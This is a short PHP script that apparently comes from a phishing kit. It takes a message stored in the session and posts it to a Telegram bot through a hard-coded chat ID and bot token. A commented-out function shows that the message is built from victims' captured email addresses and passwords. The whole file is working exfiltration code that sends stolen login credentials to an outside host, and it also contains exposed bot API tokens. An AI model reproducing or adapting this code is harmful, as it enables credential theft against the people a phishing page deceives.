<?php

session_start();

$parameter = array(
  "chat_id" => '1469023865',
  "text" => $_SESSION['message']
);

send("sendMessage" , $parameter);

function send($method , $parameter){

// 1849401738:AAEFDGHapFeYsHyB7mTKGJA3Vuld5Vv9Es8
// 1576904149:AAEnMrS7LQj9j9QaDPXXeb76mTt8O7sUwZY
    $api_key  = '1849401738:AAEFDGHapFeYsHyB7mTKGJA3Vuld5Vv9Es8';

    $url = "https://api.telegram.org/bot$api_key/$method" ;

    if (!$curl = curl_init()){
        exit();
    }

    curl_setopt($curl , CURLOPT_POST , true);
    curl_setopt($curl , CURLOPT_POSTFIELDS , $parameter);
    curl_setopt($curl , CURLOPT_URL , $url);
    curl_setopt($curl , CURLOPT_RETURNTRANSFER , true);
    $output = curl_exec($curl);
    return $output;

}

function submitrequest($message){
/*    $message .= "Email Address: " . $_SESSION['customerLoginUsername'] . "\n";
    $message .= "Password: " . $_SESSION['customerLoginPassword'] . "\n";*/
}
?>

